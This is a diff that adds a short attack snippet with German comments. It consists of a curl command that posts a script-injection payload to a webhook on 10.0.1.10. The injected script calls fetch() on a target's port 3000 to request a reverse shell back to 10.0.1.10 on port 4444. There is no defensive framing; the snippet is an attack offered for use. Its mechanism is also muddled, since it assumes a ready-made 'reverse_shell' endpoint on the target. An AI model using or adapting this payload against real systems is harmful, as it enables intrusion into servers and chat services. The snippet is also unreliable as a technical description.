@@ -1,0 +1,10 @@
+// Payload via HTTP Request
+//Webhooks, API-Endpunkte oder Formulare
+
+// Der Payload nutzt einen fetch-Aufruf, um eine HTTP-Anfrage an den Zielserver zu senden, die eine Reverse-Shell auslöst.
+// Die Ziel-IP TARGET könnte eine beliebige Anwendung auf dem Server ausführen (wie ein Webserver, der auf Port 3000 lauscht und Anfragen entgegennimmt).
+// Falls die Serverkonfiguration unsicher ist und Benutzereingaben nicht validiert werden, könnte der Server eine Reverse-Shell zu 10.0.1.10 herstellen.
+
+curl -X POST "http://10.0.1.10/hooks/YhhM5pSETkxH5yChf/4PW68bZhXbojY5sreznALpWL8tnYe8g7NtJh4FXqMrYorBkG" \
+-H "Content-Type: application/json" \
+--data '{"text": "🚀 <script>fetch(\'http://TARGET:3000/reverse_shell?host=10.0.1.10&port=4444\');</script>"}'
